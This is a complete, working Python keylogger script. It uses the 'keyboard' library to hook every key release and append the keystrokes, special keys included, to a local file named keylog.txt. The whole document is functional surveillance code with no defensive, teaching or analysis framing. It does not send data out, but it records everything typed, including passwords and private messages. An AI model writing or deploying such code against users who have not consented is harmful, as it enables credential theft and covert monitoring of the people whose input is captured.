import keyboard

def keylogger():
    log_file = 'keylog.txt'
    print(f"Keylogger started. Logging keystrokes to {log_file}")

    with open(log_file, 'a') as f:
        f.write("\n\n=== New Log ===\n")

    def callback(event):
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "\n"
            else:
                key = f"[{key}]"
        else:
            key = key.replace("'", "")
        
        with open(log_file, 'a') as f:
            f.write(key)

    keyboard.on_release(callback)

    keyboard.wait()

if __name__ == "__main__":
    keylogger()
